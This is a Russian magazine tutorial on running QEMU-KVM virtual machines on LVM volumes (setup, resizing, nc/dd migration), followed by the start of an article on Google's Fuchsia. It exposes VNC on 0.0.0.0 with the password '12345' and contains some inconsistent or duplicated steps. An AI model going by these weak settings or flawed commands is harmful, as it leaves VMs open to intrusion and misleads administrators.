                      SAS, SCSI, NVMe. Хорошим тоном при создании
                        логической группы будет указывать не имя хоста,
                       а тип носите лей, которые используются в группе.
                      Советую логическую груп пу назвать так: vg_sa‐
                   ta, vg_ssd, vg_nvme и так далее. Это поможет
                         понять, из каких носителей построена логическая
                        группа.





               Указание имени для новой логичес кой группы

Далее выберем место на физичес ком томе, где будет размещена новая
логическая группа. В данном случае спутать физический том не получится:
загрузочный раздел помечен файловой системой ext2.





      Выбор физического тома для раз мещения логической группы

Создаем наш первый логический том. Это будет том для корневого раздела
операционной системы. Выбираем пункт «Соз дать логический том».





                   Создание логичес кого тома

Выбираем группу для нового логичес кого тома. У нас она всего одна.





            Выбор логичес кой группы для нового тома

Присваиваем имя логическому тому. Правиль нее всего при назначении име‐
ни будет использовать префикс в виде наз вания логической группы — нап‐
ример, vg_sata_root, vg_ssd_root и так далее.





                   Задаем наз вание нового тома

Указываем  объем  для  нового  логичес кого  тома.  Советую  выделить
под корень 10 Гбайт, но можно и меньше, благо логический том всегда мож‐
но расширить.





                   Задаем наз вание нового тома



                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
       РЕЗИНОВЫЙ
       ГИПЕРВИЗОР
               ИСПОЛЬЗУЕМ ЛОГИЧЕСКИЕ ГРУППЫ
            ДЛЯ ВИРТУАЛИЗАЦИИ QEMU‐KVM В LINUX




По аналогии с примером выше создаем следующие логичес кие тома:
 • vg_sata_home — 20 Гбайт под каталоги пользователей;
 • vg_sata_opt — 10 Гбайт для установки прикладного ПО;
 • vg_sata_var — 10 Гбайт для часто меня ющихся данных, к примеру логов
   системы и других программ;
 • vg_sata_tmp — 5 Гбайт для временных данных, если объ ем временных
   данных велик, можно сделать и больше. В нашем примере этот раздел
   не создавался за ненадобностью;
 • vg_sata_swap — равен объему оперативной  памяти. Это  раз дел
   для свопа, и создаем мы его для подс тра ховки — на случай, если закон‐
   чится оперативная память на гипервизоре.

После создания всех томов завершаем работу менеджера.





           Завершение работы менеджера логических томов

Теперь имеем несколько томов для соз дания разделов операци онной сис‐
темы. Нетрудно догадать ся, что для каждого раздела есть свой логичес кий
том.





          Состояние логичес кой группы пос ле создания томов

Создаем одноименный раздел под каждый логичес кий том.





          Состояние логичес кой группы пос ле создания томов

Сохраняем и записываем проделанные изменения.





          Состояние логичес кой группы пос ле создания томов

После сохранения изменений разметки диска начнут ставиться базовые ком‐
поненты системы, а затем будет предложено выб рать и установить допол‐
нительные компоненты системы. Из всех компонентов нам понадобится ssh‐
server и стандартные сис темные утилиты.





              Выбор допол нитель ных компонентов

После установки будет сформирован и записан на диск загрузчик GRUB.
Устанавливаем его на тот физичес кий диск, где сохранен загрузочный раз‐
дел, то есть /dev/sda.





              Пред ложение записать загрузчик на диск





               Выбор диска для записи загрузчика

Теперь ждем, пока закон чится запись загрузчика на диск, и после оповеще‐
ния перезагружаем гипервизор.





                       Запись заг рузчика





            Сообщение об окончании уста новки системы

После перезагрузки системы заходим на гипервизор по SSH. Первым делом
под рутом устанавливаем нужные для работы утилиты.


$ sudo apt‐get install ‐y sudo htop screen net‐tools dnsutils bind9u
tils sysstat telnet traceroute tcpdump wget curl gcc rsync

Настраиваем SSH по вку су. Советую сразу сделать авторизацию по ключам.
Перезапускаем и проверяем работоспособность службы.


$ sudo nano /etc/ssh/sshd_config
$ sudo systemctl restart sshd; sudo systemctl status sshd

Перед установ кой софта для виртуализации необ ходимо проверить физичес‐
кие тома и состояние логический группы.


$ sudo pvscan
$ sudo lvs

Устанавливаем компоненты виртуализации и утилиты для соз дания сетевого
моста на интерфейсе гипервизора.


$ sudo apt‐get update; apt‐get upgrade ‐y
$ sudo apt install qemu‐kvm libvirt‐bin libvirt‐dev
libvirt‐daemon‐system libvirt‐clients virtinst bridge‐utils

После установ ки настраиваем сетевой мост на гипервизоре. Комментируем
настройки сетево го интерфейса и зада ем новые:


$ sudo nano /etc/network/interfaces

Содержимое будет при мерно таким:


auto br0
iface br0 inet static
address 192.168.1.61
netmask 255.255.255.192
gateway 192.168.1.1
broadcast 192.168.0.61
dns‐nameserver 127.0.0.1
dns‐search xakep.ru
bridge_ports enp2s0
bridge_stp off
bridge_waitport 0
bridge_fd 0

Добавляем нашего пользователя, под которым будем работать с гипер‐
визором, в группы libvirt и kvm (для RHEL группа называется qemu).


$ sudo gpasswd ‐a iryzhevtsev kvm
$ sudo gpasswd ‐a iryzhevtsev libvirt

Теперь необходимо инициализировать нашу логическую группу для работы
с гипервизором, запустить ее и добавить в автозагрузку при запус ке сис‐
темы.


$ sudo virsh pool‐list
$ sudo virsh pool‐define‐as vg_sata logical ‐‐target /dev/vg_sata
$ sudo virsh pool‐start vg_sata; sudo virsh pool‐autostart vg_sata
$ sudo virsh pool‐list


             INFO

                     Для нормальной работы группы LVM с QEMU‐KVM
                        требуется сначала акти вировать логическую груп‐
                        пу через консоль virsh.


Теперь скачиваем дистрибутив для установки на гостевые системы и кладем
его в нужную папку.


$ sudo wget https://mirror.yandex.ru/debian‐cd/9.5.0/amd64/iso‐cd/
debian‐9.5.0‐amd64‐netinst.iso
$ sudo mv debian‐9.5.0‐amd64‐netinst.iso /var/lib/libvirt/images/; ls
 ‐al /var/lib/libvirt/images/

Чтобы подключаться к виртуальным машинам по VNC, отредактиру ем файл /
etc/libvirt/libvirtd.conf:


$ sudo grep "listen_addr = " /etc/libvirt/libvirtd.conf

Раскомментируем и изменим строчку listen_addr = "0.0.0.0". Сохраняем
файл, перезагружаем гипервизор и про веря ем, все ли службы запустились
и работают.


             INFO

                       Чтобы отличить разделы гостевых ОС от разделов
                       гипервизора,  рекомендую  использовать  такое
                      обозначение  логических  томов:  vg_sata_<
                   guestos_hostname>_root. Например: vg_sa‐
                             ta_test_root, vg_sata_test_tmp и так далее.



СОЗДАНИЕ ВИРТУАЛЬНОЙ МАШИНЫ И УПРАВЛЕНИЕ ЕЙ
Создадим диски для новой виртуальной машины из консоли на гипервизоре:


$ sudo lvcreate ‐L 10G ‐n vg_sata_test_root vg_sata
$ sudo lvcreate ‐L 20G ‐n vg_sata_test_home vg_sata
$ sudo lvcreate ‐L 10G ‐n vg_sata_test_opt vg_sata
$ sudo lvcreate ‐L 10G ‐n vg_sata_test_var vg_sata
$ sudo lvcreate ‐L 5G ‐n vg_sata_test_tmp vg_sata
$ sudo lvcreate ‐L 2G ‐n vg_sata_test_swap vg_sata

Запускаем утилиту screen и в новом скрине соз даем новую виртуальную
машину следующей командой:


$ sudo virt‐install \
‐‐connect qemu:///system \
‐‐name=test.xakep.local \
‐‐ram 2048 \
‐‐cpu host \
‐‐vcpus 1 \
‐‐disk path=/dev/vg_sata/vg_sata_test_root,format=raw,bus=virtio,
cache=none \
‐‐cdrom /var/lib/libvirt/images/debian‐9.5.0‐amd64‐netinst.iso \
‐‐description="debian‐test.xakep.local" \
‐‐graphics vnc,listen=0.0.0.0,keymap=us,password=12345 \
‐‐os‐type=linux \
‐‐os‐variant=debiansqueeze \
‐‐network bridge:br0 \
‐‐video=vga \
‐‐hvm \
‐‐accelerate


             INFO

                     Подробную информацию по парамет рам установ‐
                        ки ВМ можно получить коман дой virt‐install ‐‐help.


Отсоединяем на время скрин комбинаци ей Ctrl + A + D и подключаем соз‐
данные нами логические тома к машине нехитрой манипуляцией. Для каждого
логического тома новой ВМ создаем такой файл XML.


vg_sata_test_home.xml
<disk type='block' device='disk'>
<driver name='qemu' type='raw' cache='none' io='native'/>
<source dev='/dev/vg_sata/vg_sata_test_home'/>
<backingStore/>
<target dev='vdb' bus='virtio'/></disk>

В теге source указываем мес тоположение логичес кого тома на гипервизоре,
в теге target — название диска (vdb, vdc и так далее). Повторя ем для каждого
логического тома, кроме root (он уже подключен как vda и активен). Пос ле
того как все файлы будут соз даны, подключим все тома к виртуальной
машине:


$ sudo virsh attach‐device ‐‐config <имя новой ВМ> vg_sata_<имя ВМ>_<
имя раздела>.xml

Если все сделано правильно, на экра не появится сообщение Device attached
successfully.
   Теперь можно подключать ся к машине по VNC и устанавливать ОС,
используя, например, krdc или любую дру гую утилиту. При подключении нужно
указать сетевой адрес гипервизора и порт 5900. Проверить, какие порты
открыты, можно вот так:


$ sudo netstat ‐tulnp | grep qemu
$ sudo virsh vncdisplay <имя новой ВМ>

:0 соответствует пор ту 5900, а :1 — пор ту 5901.
  При установке гостевой системы делаем ручную разметку диска с фай‐
ловой системой ext4. Каждому разделу выделен свой диск vdX. Загрузчик
прописываем в VDA.
  В результате всех действий ты получишь рабочую виртуальную машину,
которая будет иметь адрес в локальной сети.


        WWW

                   •Мануал по коман дам virsh



Для любите лей GUI тоже есть приятная новость. Если ты предпочитаешь
работать в «Иксах», то тебе пригодится утилита virt‐manager. Ниже я опишу
работу с ней в Debian 9 и KDE.
   Устанавливаем пакет. Пос ле установки запус каем утилиту.


$ sudo apt‐get install ‐y virt‐manager

Подключаемся к гипервизору по  IP, вводим логин и пароль пользователя,
который добавлен в груп пу libvirt на гипервизоре. Связь установлена. Теперь
приступаем к созданию и настройке вир туаль ной машины. После под клю‐
чения гипервизора кликаем правой кнопкой и выбираем «Добавить новое».
Появится окно менеджера соз дания вир туальных машин.
  В окне выбираем «Уста новка с локального обра за» и нажимаем «Далее».





                      Создание новой ВМ

Выбираем «Использовать  ISO‐образ» и находим  его на  гипервизоре.
Нажимаем «Выбрать образ» и «Далее».





                  Выбор локального обра за

Выставляем параметры ЦП и памяти, жмем «Далее».





                    Парамет ры ЦП и памяти

Указываем носитель для системы — логичес кий том LVM. Выбираем уже име‐
ющийся пул vg_sata и нажимаем зна чок «плюс» (добавить). Создаем новый
корневой раздел vg_sata_<имя  ВМ>_root и указываем объем носите ля.
Жмем «Финиш».





                    Ука зываем том LVM как носитель

В последнем окне проверя ем настройки сети: ВМ должна использовать
сетевой мост. Ставим галку «Конфигурация машины до установки ОС». Жмем
«Финиш».





                    Перепроверка нас троек

В появившемся окне добавляем остальные соз данные логические тома к ВМ
через добавление новых девайсов.





               Добавление логических томов к ВМ

После того как все тома будут подключены, нажимаем кнопку «Начать уста‐
новку» и устанавливаем ОС на новую ВМ.


                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
       РЕЗИНОВЫЙ
       ГИПЕРВИЗОР
               ИСПОЛЬЗУЕМ ЛОГИЧЕСКИЕ ГРУППЫ
            ДЛЯ ВИРТУАЛИЗАЦИИ QEMU‐KVM В LINUX





РАСШИРЕНИЕ РЕСУРСОВ ГИПЕРВИЗОРА
Для расширения ресурсов на гипервизоре может понадобиться даунтайм.
Поэтому машины с гипер визора нужно мигрировать на другой гипервизор.
Это касается обновле ния и расширения ресурсов ЦП и памяти. Исклю‐
чение — если сервер поддерживает технологию hot‐plug, которая поз воляет
добавлять компоненты, не выключая сервер. С ней можно попробовать про‐
вести расширение без даунтайма.
  В  качестве примера рас смотрим рас ширение  VG. Проверим нашу
логическую группу томов.


$ sudo vgs



  VG      #PV #LV #SN Attr   VSize   VFree
  vg_sata   1 17 0 wz‐‐n‐ 232.64g 47.57g


Проверяем доступные диски.


$ sudo lsblk ‐l | grep disk



  sda 8:0 0 232.9G  0 disk
  sdb 8:16 0 232.9G  0 disk


Необходимо подготовить новый диск под использование LVM.


$ sudo fdisk /dev/sdb



  Command (m for help): n
  Partition type
     p   primary (0 primary, 0 extended, 4 free)
     e   extended (container for logical partitions)


    Select (default p): e
  Partition number (1‐4, default 1): 1
  First sector (2048‐488397167, default 2048): 2048
  Last  sector,  +sectors  or  +size{K,M,G,T,P}  (2048‐488397167,  default
  488397167): 244198583


    Created a new partition 1 of type 'Extended' and of size 116.5 GiB.


    Command (m for help): t
  Partition type (type L to list all types): 8e
  Changed type of partition 'Extended' to 'Linux LVM'.


    Command (m for help): w
  The partition table has been altered.
  Calling ioctl() to re‐read partition table.
  Syncing disks.


Создаем новый физический том.


$ sudo pvcreate /dev/sdb1



  Physical volume "/dev/sdb1" successfully created.


Проверяем, что новый физичес кий том соз дался.


$ sudo pvscan



  PV /dev/sda5   VG vg_sata         lvm2 [232.64 GiB / 47.57 GiB free]
  PV /dev/sdb1                      lvm2 [116.44 GiB]
  Total: 2 [349.09 GiB] / in use: 1 [232.64 GiB] / in no VG: 1 [116.44
  GiB]


Расширяем группу с помощью нового физического тома.


$ sudo vgextend vg_sata /dev/sdb1



  Volume group "vg_sata" successfully extended


Проверяем, что группа расширена на 116 Гбайт.


$ sudo  pvscan



  PV /dev/sda5   VG vg_sata         lvm2 [232.64 GiB / 47.57 GiB free]
  PV /dev/sdb1   VG vg_sata         lvm2 [116.44 GiB / 116.44 GiB free]
  Total: 2 [349.08 GiB] / in use: 2 [349.08 GiB] / in no VG: 0 [0   ]



$ sudo pvcreate /dev/sdb1



  Physical volume "/dev/sdb1" successfully created.



$ sudo pvscan



  PV /dev/sda5   VG vg_sata         lvm2 [232.64 GiB / 47.57 GiB free]
  PV /dev/sdb1                      lvm2 [116.44 GiB]
  Total: 2 [349.09 GiB] / in use: 1 [232.64 GiB] / in no VG: 1 [116.44
  GiB]


Проверяем, что свободного мес та стало больше.


$ sudo vgdisplay | grep "Free  PE / Size"



  Free  PE / Size       41986 / 164.01 GiB


Можно также при необ ходимости уда лить физический том из логической
группы.


$ sudo vgreduce vg_sata /dev/sdb1



  Removed "/dev/sdb1" from volume group "vg_sata"



$ sudo vgdisplay | grep "Free  PE / Size"



  Free  PE / Size       12178 / 47.57 GiB



РАСШИРЕНИЕ РЕСУРСОВ ВИРТУАЛЬНОЙ МАШИНЫ
С виртуальными машина ми все примерно так же, как с гипервизором.
При расширении ресурсов CPU и RAM необходима перезагрузка ВМ (то есть
даунтайм). А с дисками все намного проще: LVM поз воляет рас ширить объем
диска на лету, без перезагрузки ВМ.
   Расширить ресурсы ВМ мож но командой virsh  edit  <имя  ВМ>.
Перед изменением конфигура ции делаем резервную копию ее конфигура‐
ционного файла.


$ virsh dumpxml <имя ВМ> >> /var/lib/libvirt/images/<имя ВМ>
‐20181126.xml

Теперь можно производить рас ширение ресурсов.


$ virsh edit <имя ВМ>

Редактируем сле дующие параметры:
 • <memory unit=KiB>4194304 — общий (максимальный) объем памяти
  ВМ (в килобайтах);
 • <currentMemory unit=KiB>4194304 — объем используемой памяти
  ВМ (в килобайтах);
 • <vcpu placement=static>2 — количес тво ядер процессора.

После редактирования сохраня ем файл конфигура ции ВМ. И в самой ВМ
завершаем работу:


$ sudo shutdown ‐h now

После выключения ВМ на гипервизоре включаем ВМ с помощью такой коман‐
ды:


$ sudo virsh start <имя ВМ>

Все, ресурсы ЦП и память расширены, можно проверять.


Расширяем диски
Расширение объемов дисков на ВМ достаточно простая операция. Надо
просто соблюдать определенную последова тельность действий.
  Сначала на гипервизоре проверя ем, какой раз дел будем расширять.


$ sudo lvs ‐‐units g /dev/mapper/vg_sata‐vg_sata_pxe_opt



  LV              VG      Attr       LSize  Pool Origin Data%  Meta%  Move
   Log Cpy%Sync Convert
    vg_sata_pxe_opt vg_sata ‐wi‐ao‐‐‐‐ 20.00g


Теперь расширяем том на нуж ное количество гигабай тов (это чис ло строго
ограничено объемом группы, но его тоже можно рас ширить).


$ sudo lvextend ‐L +5G /dev/vg_sata/vg_sata_pxe_opt



  Size of logical volume vg_sata/vg_sata_pxe_opt changed from 20.00 GiB
  (5120 extents) to 25.00 GiB (6400 extents).
  Logical volume vg_sata/vg_sata_pxe_opt successfully resized.


Убеждаемся, что логический том рас ширен. Запоминаем значение LSize.


$ sudo lvs ‐‐units k /dev/mapper/vg_sata‐vg_sata_pxe_opt



  LV              VG      Attr       LSize        Pool Origin Data%  Meta%
  Move Log Cpy%Sync Convert
  vg_sata_pxe_opt vg_sata ‐wi‐ao‐‐‐‐ 26214400.00k


Увеличить размер блоч ного устройства мож но из консоли virsh.


$ sudo virsh

Смотрим список виртуальных машин.


virsh # list



   Id    Name           State
   1     gitlab         running
   3     dev            running
   8     pxe            running


Проверяем имеющиеся логичес кие тома на виртуаль ной машине.


virsh # domblklist pxe



  Target     Source
  vda        /dev/vg_sata/vg_sata_pxe_root
  vdb        /dev/vg_sata/vg_sata_pxe_opt
  vdc        /dev/vg_sata/vg_sata_pxe_var
  vdd        /dev/vg_sata/vg_sata_pxe_swap


Расширяем выбранный том на нуж ный размер (вспоминаем значение LSize).


virsh # blockresize pxe ‐‐path /dev/vg_sata/vg_sata_pxe_opt ‐‐size
26214400



  Block device '/dev/vg_sata/vg_sata_pxe_opt' is resized


Выходим из консоли:


virsh # quit

Переходим к настрой кам на гос тевой ОС. Зап рашиваем информацию о сос‐
тоянии расширяемого раздела:


$ sudo df ‐h /opt/



  Filesystem      Size  Used Avail Use% Mounted on
  /dev/vdb1 19G   41M   18G   1% /opt


Запускаем утилиту parted, вводим информацию о разделе и указываем, какой
раздел и насколько увеличить.


$ sudo parted /dev/vdb



  GNU Parted 3.2
  Using /dev/vdb


    (parted) print


  Model: Virtio Block Device (virtblk)
  Disk /dev/vdb: 26.8GB
  Sector size (logical/physical): 512B/512B
  Partition Table: msdos
  Disk Flags:
  Number  Start   End     Size    Type     File system  Flags
   1 1049kB  20.1GB  20.1GB  primary  ext4


    (parted) resizepart 1
  Warning:  Partition  /dev/vdb1  is  being  used.  Are  you  sure  you  want
  to continue?
  Yes/No? yes


  End?  [20.1GB]? 26.8GB


  (parted) q


  Information: You may need to update /etc/fstab.


Чтобы расширить файловую систему на нужном раз деле, пишем


$ sudo resize2fs /dev/vdb1



  resize2fs 1.43.4 (31‐Jan‐2017)
  Filesystem at /dev/vdb1 is mounted on /opt; on‐line resizing required
  old_desc_blocks = 2, new_desc_blocks = 4
  The filesystem on /dev/vdb1 is now 6542712 (4k) blocks long.


Проверяем состояние раздела, его объем должен стать больше.


$ sudo df ‐h /opt/



  Filesystem      Size  Used Avail Use% Mounted on
  /dev/vdb1 25G   44M   24G   1% /opt



МИГРАЦИЯ ВИРТУАЛЬНОЙ МАШИНЫ НА ДРУГОЙ ГИПЕРВИЗОР
Жизнь часто готовит нам сюр призы. Щедрое руководство может решить
обновить парк серверов и списать ста рые. А иногда может, например, выйти
из строя материнская плата на сервере времен крестовых походов.
  В любом случае на помощь нам приходит миграция виртуальных машин
с одного физического сервера на дру гой. Но тут встает один вопрос: мы же
используем LVM и нам надо копировать блочные устрой ства. Как это правиль‐
но сделать?
   Кто‐то верно сказал, что любую задачу можно решить командой dd, надо
только правильно подоб рать параметры. А в совокупности с утилитой nc мож‐
но вообще победить вселенское зло. Это как раз и есть наш случай.
   Если использовать rsync или scp для копирования по сети, то пока оно
будет идти, ты успеешь выйти на пенсию. Утилита nc поможет сохранить наше
драгоценное время.
  Делаем резер вную копию конфига нашей мигриру ющей ВМ и выключаем
ВМ.


$ sudo virsh dumpxml test >> /tmp/test‐20181128.xml

Определим объем передаваемых данных. В нашем при мере это 57 Гбайт.
Не хило, правда?
  Заодно убедись, что блочное устройство не занято другими процессами
(ВМ должна быть потушена), об этом нам скажет флаг ‐wi‐a‐‐‐‐‐. Если
занято, то там будет ‐wi‐ao‐‐‐‐.


$ sudo lvs ‐‐units g | grep vg_sata_test



  vg_sata_test_home   vg_sata ‐wi‐a‐‐‐‐‐ 20.00g
  vg_sata_test_opt    vg_sata ‐wi‐a‐‐‐‐‐ 10.00g
  vg_sata_test_root   vg_sata ‐wi‐a‐‐‐‐‐ 10.00g
  vg_sata_test_swap   vg_sata ‐wi‐a‐‐‐‐‐  2.00g
  vg_sata_test_tmp    vg_sata ‐wi‐a‐‐‐‐‐  5.00g
  vg_sata_test_var    vg_sata ‐wi‐a‐‐‐‐‐ 10.00g


Создаем на гипервизоре‐получа теле логичес кие тома по аналогии с гипер‐
визором‐отправителем:


$ sudo lvcreate ‐L 10G ‐n vg_sata_test_root vg_sata



  Logical volume "vg_sata_test_root" created.


Передаем файл конфигурации на другой гипервизор. Тут можно исполь‐
зовать и rsync.


$ sudo rsync ‐avzP /tmp/test‐20181128.xml 192.168.1.52:/tmp/



  sending incremental file list
  test‐20181128.xml
            6,463 100%    0.00kB/s    0:00:00 (xfr#1, to‐chk=0/1)
  sent 1,566 bytes  received 35 bytes  355.78 bytes/sec
  total size is 6,463  speedup is 4.04


Теперь  передаем  блочные  устройства  между  двумя  гипервизорами.
На получателе выполняем такую команду:


$ sudo nc ‐l ‐p 27015 | pv | dd bs=16M of=/dev/vg_sata/vg_sat
a_test_swap

На источнике запускаем


$ sudo dd bs=16M if=/dev/vg_sata/vg_sata_test_swap | nc <ip‐адрес
получателя> 27015

Ждем, пока закончится передача данных и запись блочного устройства в сис‐
теме. Повторяй операцию для всех логичес ких томов мигрирующей ВМ.
  После  передачи  необ ходимо  инициализировать  нашу  виртуальную
машину, запустить и добавить в авто загрузку.


$ sudo virsh create /tmp/test‐20181128.xml
$ sudo virsh start test
$ sudo virsh autostart test

На этом миграция виртуальной машины закончена!


        WWW

                     •Remote Mirroring with nc and dd
                      •Краткое руководство по LVM на сайте XGU
                     •Создание виртуальных машин KVM
                                •virt‐install man по‐русски
                     •Инструк ция по расширению ресурсов гостевой
                   ОС в документации RHEL
GEEK





 ВЕЧНОЗЕЛЕНАЯ
      ФУКСИЯ

              ИЗУЧАЕМ ОПЕРАЦИОНКУ,

     Евгений Зобнин           КОТОРУЮ GOOGLE ГОТОВИТ  Редактор Unixoid и Mobile
        zobnin@glc.ru                   НА СМЕНУ ANDROID




Впервые исходники новой загадочной ОС Google всплыли
в Сети в августе 2016 года. К маю 2017‐го они обросли
кое‐какой  документацией  и  обзавелись  аль фа‐версией
интерфейса. Сегодня «Фуксия» — хорошо документирован‐
ная и активно развива емая, но не ОС, а нечто гораздо боль‐
шее.


В ДАЛЕКОМ-ДАЛЕКОМ 2008-М
Когда в 2007 году стало известно о работе Google над мобильной операци‐
онной системой, немногие поняли, зачем это нужно. Тогда существовали
вполне  успешная  Symbian,  Windows  Mobile,  стремительно  развивался
мобильный Linux (MeeGo). Android не вписывал ся в ряды существующих ОС,
да и было не совсем понят но, зачем он вооб ще нужен «Гуглу».
  Истинная цель стала извес тна только в 2008 году с появлением первого
смартфона на Android. Тогда уже существовала iOS (а точнее, iPhone OS), и в
целом Android был на нее похож, но имел одно очень инте ресное и важное
отличие — бесшовную интегра цию с сервисами Google. Купивший телефон
человек вводил свой email и пароль в ходе началь ной нас тройки — и вуаля,
на телефон начинали сыпаться уведомления о новых письмах, событиях
в календаре, приходили сообщения в Google Talk, система синхронизировала
адресную книгу с облаком.
  Для Google Android был способом завлечения и закрепления пользовате‐
лей в собственной экосистеме. Если ты покупал телефон на Android, ты вряд
ли стал бы тратить время на нас тройку осталь ных аккаунтов и установку
дополнительных приложений. Гораз до проще один раз ввести пароль
от Gmail и пользоваться стандартным софтом «Гугла».
  В дальнейшем Google все больше интегрировала себя в телефоны поль‐
зователей. Появилась возможность доступа к вкладкам Chrome, открытым
на стационарном компе, появилась интегра ция с Google Drive, голосовой
поиск, был запущен Google Now, который авто матически выводил на экран
подсказки в зависимости от мес тополо жения юзера, его пре дыдущих поис‐
ковых запросов, событий в календаре и дру гих действий. Позже Google Now
был расширен до Now On Tap, который показы вал под сказ ки в зависимости
от отображаемой на экране информации, а на смену ему в итоге пришел
Google Assistant — своего рода единая система поиска и подсказок.
   Теперь Google работает над технологией интеграции частей других при‐
ложений в Google Assistant (технология Slices), что позволит еще глубже внед‐
рить себя в телефоны пользователей. Проблема толь ко в том, что все это они
делают в отношении не предназначенной для этого операционной системы.
  Конечная цель Google больше не в том, чтобы интегрировать ОС со сво‐
ими сервисами, а в том, чтобы сделать саму ОС «Гуглом» и избавиться
от набившего оскомину воркфлоу, когда для выполнения задачи пользовате‐
лю нужно найти, скачать и запус тить приложение. Операци онная система
должна просто выпол нять просьбы пользователя и подстраиваться под него.
И Android плохо подходит для решения такой задачи.





                  Fuchsia на PixelBook. Фото: Ars Technica


GOOGLE В КАЖДОМ КАРМАНЕ
Ни в одном макете интерфейса Fuchsia нет и намека на меню приложений,
сетку иконок или что‐либо похожее. Интерфейс Fuchsia — это нечто вроде
ленты Google Feed со строкой поиска. Здесь ты можешь увидеть события
календаря, письма, сооб щения из мессенджеров и многое другое. Это мало
чем отличается от того же Google Feed, с той разницей, что в этом слу чае ты
видишь не результат работы одного из приложений, а своего рода визу аль‐
ное представление того, как работает ОС.





                Главный экран Fuchsia. Фото: 9To5Google

Ключевые компонен ты Fuchsia — это не файлы и приложения, как в клас‐
сических операционных системах, а сущности и агенты. Сущностями в «Фук‐
сии» может быть все что угодно: мес то, человек, событие, вещь, email и так
далее. Это единицы информации, которые позволя ют операционной сис теме
«понимать», с чем имеет дело пользователь.
   Генерацией сущностей занимаются агенты — специальные компоненты
приложений, предназначенные для анализа потоков информации. Простей‐
ший агент — это maxwell_btl. Его задача — сканировать отображаемый
на экране текст на наличие email‐адресов, генерировать на их основе сущ‐
ности и отдавать их операционной системе, а точнее подсистеме Maxwell.
   Благодаря такому простому агенту ОС всегда зна ет, с какими email‐адре‐
сами и в каких ситуациях сталкивался пользователь, и в дальнейшем может
давать подсказки на осно ве этой информации. Но есть и более инте ресные
примеры. Представь, что друг присылает тебе ссылку на YouTube‐ролик. Ты
открываешь его в плеере, и, пока смот ришь ролик, агент YouTube, как бы
странно это ни звучало, собира ет об этом ролике раз личные метаданные,
создает из них сущность и отда ет ее Maxwell. А тот, в свою очередь, отдает ее
ленте, отображаемой на рабочем сто ле. И вот, один раз прослушав трек Хас‐
ки, ты уже видишь на рабочем столе и в сво ем плеере предложение скачать
и заценить его новый аль бом.





                 Браузер Fuchsia. Фото: 9To5Google

Как и сама Google, ее новая ОС будет знать все, чем бы ты ни занимал ся,
но на гораздо более глубоком уровне. Она сможет составлять для тебя
плей‐листы по настроению, подсказывать, куда сходить сегодня вечером,
на основе твоего расписания и обсуждений в почте. Она предложит тебе
купить билеты, зная, что ты зап ланировал слетать в Сызрань через два дня.
Все необходимые технологии будут заложены в самой опе рационной сис‐
теме.
  Просто представь: ты открываешь бра узер, заходишь на сайт одного
из ресторанов, затем добавляешь событие в свой календарь и говоришь:
«Окей, Google, пригласи Ирину на ужин». И Google Assistant понимает, о чем
речь. Он находит в списке сущ ностей событие календаря, просматривает
предшествующие ему сущности, связывает все вмес те и отправляет Ирине
сообщение с приглашением в такой‐то рес торан в такое‐то время.


ПОИСТИНЕ ОБЛАЧНАЯ ОС
Как  и  любая  современная ОС,  Fuchsia  полагается  в  своей  работе
на облачные технологии, но опять же идет намного дальше других ОС. Сегод‐
ня облака для мобильных ОС понимаются как нечто вроде склада файлов,
контактов, сообщений и дру гой ерунды, которую ФБР покупает за миллион
долларов, чтобы побольше узнать о владельце.





               Быстрые нас трой ки. Фото: 9To5Google

В Fuchsia облако станет не просто местом бэкапа данных, оно превратится
в связующее звено для всего. Представь, что ты сидишь с ноутбуком, набира‐
ешь текст на клавиатуре, попутно общаясь с кем‐то в «Телеграме» под звуки
синтвейва. Внезапно звонит начальник, ты сры ваешься с места с одним
телефоном, а затем раз блокируешь его и видишь все тот же воркфлоу:
редактор, «Телеграм» и музыкальный плеер.
  Система  синхронизировала  твои  устройства  и  даже  доустановила
на телефон  текстовый  редактор — минималь ную  часть, необходимую
для базовой работы с текстом, — все‐таки канал не резиновый, а понадобит‐
ся ли весь интерфейс на телефоне, неясно. Сохранилось даже содержимое
буфера обмена и расположение открытых окон  (а  точнее, «историй»,
о которых мы поговорим поз же).





     Та же панель настроек в телефонном варианте. Фото: Ars Technica

Всем, что связано с обла ками, в «Фуксии» заправляет Ledger — рас пре‐
деленное хранилище, выс тупа ющее в роли «второй памяти» устройства. Туда
дублируется все: данные приложений, сами приложения (а точнее, компонен‐
ты), документы, настройки, истории, твои фотографии с солнышком в руках.
Это не аналог Google Drive или iCloud, это аналог второго жесткого диска
в рейд‐массиве. При этом он совсем не обязателен к использованию.
   Ledger — модульная сис тема. По умолчанию он базируется на гугловском
сетевом хранилище Firestore, но производители смартфонов смогут переобо‐
рудовать его на собственное облачное хра нилище. Не исключен вари ант
и Ledger, который использует твой домашний сервак в качес тве хранилища.





                       Архитектура Ledger


МОДУЛЬНАЯ И МАСШТАБИРУЕМАЯ
Начиная с самых базовых уровней и заканчивая видимыми пользовате лю эле‐
ментами, компоненты Fuchsia максимально изо лированы и логически отде‐
лены друг от друга. Fuchsia базиру ется на микроядре Zircon, которое, в свою
очередь, представляет собой надстройку над минималистичным ядром LK.
   Zircon обеспечивает такие возможнос ти, как управление памятью, соз‐
дание и уничтожение процес сов, а также выступа ет в качестве мультиплексо‐
ра для драйверов, файловых систем и сетево го стека, которые не являются
частью ядра, а, как и положено микроядрам, выполняются в обособленных
процессах.
   Zircon — это первый слой пирога под наз ванием Fuchsia. Над ним рас‐
полагается Garnet, прос лойка, обеспечива ющая воз можности запуска при‐
ложений. Сюда входят драйверы, библиотеки, гра фический рендерер Escher,
система обновления Amber (основана на The Updater Framework), менеджер
пакетов и система виртуализации Guest, которая позволяет, например,
запустить Linux‐окружение внутри Fuchsia.
  Следующий уровень, Peridot — это то место, где работают компоненты.
В Fuchsia компонент представляет собой нечто вроде исполняемого фраг‐
мента кода, будь то уже знакомые нам агенты или видимые пользователю
приложения (здесь они называются модулями). Компоненты сильно отли‐
чаются от исполняемых файлов в дру гих ОС: они всегда изолированы в собс‐
твенной песочнице и могут общать ся с внешним миром исключительно
с помощью специального IPC‐механизма, основанного на языке FIDL.
   Благодаря унифицированному IPC системе абсолютно неважно, на каком
языке написаны отдельно взятые компоненты. Fuchsia поддерживает Dart, Go,
Rust, Swift, Java и JavaScript; все эти языки могут общаться через единый
интерфейс. Филосо фия Fuchsia в том, чтобы компоненты были как можно
более компактного размера. Нап ример, плеер может состоять из множества
написанных на разных языках компонентов, которые работают как единое
целое.
